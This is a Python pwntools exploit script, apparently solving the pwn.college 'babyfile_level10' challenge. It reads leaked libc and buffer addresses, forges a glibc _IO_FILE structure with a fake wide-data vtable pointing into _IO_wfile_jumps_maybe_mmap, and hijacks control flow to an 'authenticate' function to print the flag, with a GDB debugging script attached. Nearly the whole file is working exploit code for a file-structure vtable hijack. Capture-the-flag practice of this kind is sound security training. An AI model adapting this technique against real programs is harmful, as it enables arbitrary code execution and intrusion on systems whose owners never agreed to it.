#!/usr/bin/env python3
from pwn import *
import sys
import os
import socks
import socket
# Cre: Broder

_libc = "./libc.so.6"
_ld = "./ld-linux-x86-64.so.2"

HOST = 'localhost'
port = 1337
_arch = 64

user = os.getenv('USER')
if user == 'broder':
    binary = "./babyfile_level10_patched"
else:
    binary = "/challenge/babyfile_level10"
    
context.log_level = 'info'
context.binary = elf = ELF(binary, checksec=False)

if user == 'broder':
    libc = ELF(_libc, checksec=False)
    _ld = ELF(_ld, checksec=False)
else:
    libc = elf.libc



environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'),
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs = f"""
set solib-search-path {os.getcwd()}
b *main
b *challenge+299
c
decompiler connect ida --host 172.19.176.1 --port 3662
b *fwrite
b *_IO_wfile_overflow
b *_IO_wdoallocbuf
b *authenticate+37
b *authenticate+79
c
c
p fp
p *(struct _IO_FILE_plus *)$2
p (*(struct _IO_FILE_plus *)$2)->file->_wide_data
p *$4
c
c
nextcall
"""

info        = lambda msg: log.info(msg)
success     = lambda msg: log.success(msg)
error       = lambda msg: log.error(msg)
sla         = lambda msg, data: io.sendlineafter(msg, data)
sa          = lambda msg, data: io.sendafter(msg, data)
sl          = lambda data: io.sendline(data)
s           = lambda data: io.send(data)
rcu         = lambda data: io.recvuntil(data)

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

def stop():
    if args.GDB:
        pause()

def start():
    if args.GDB:
        if args.VSCODE:
            context.terminal = ["/home/broder/.vscode-terminal"]
        return gdb.debug(elf.path, gdbscript=gs)
        # return gdb.debug(elf.path, env=environ, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, port)
    else:
        return process(elf.path)
        # return process(elf.path, env=environ)


io = start()
rcu(b'[LEAK] The address of puts() within libc is: ')
# info(f"{hex(libc.sym['_IO_wfile_jumps_maybe_mmap'])}")
libc.address = int(io.recvline().strip(), 16) - libc.sym['puts']
rcu(b'[LEAK] You are writing to: ')
buffer = int(io.recvline().strip(), 16)
win = elf.sym['authenticate'] 
# win = elf.sym['authenticate'] + 79
success(f"libc base @ {hex(libc.address)}")

if user == 'broder':
    fake_vtable = libc.sym['_IO_wfile_jumps_maybe_mmap'] + 160
else:
    fake_vtable = libc.address + 0x1e8de0
success(f"fake_vtable @ {hex(fake_vtable)}")
_wide_data = buffer - 224 
_wide_data += 16
fs = b'password' # password
fs += b'\x00' * 8
fs += p(buffer + 24 - 0x68)     # _wide_data.vtable
fs += p(win)
fs += p(0) * (1 + 12 - len(fs) // 8)
fs += p(libc.sym['_IO_2_1_stderr_'])
fs += p32(3) + p8(0) * 20
fs += p(libc.address + 0x1ec000)           # lock
fs += p(0xffffffffffffffff)
fs += p(0)
fs += p(_wide_data)            
fs += p(0) * 4
fs += p8(0) * 16
fs += p(fake_vtable)

print(len(fs))
s(fs)
rcu(b'{')
flag = b'pwn.college{' + io.recvuntil(b'}')
success(f"flag: {flag}")
io.interactive()
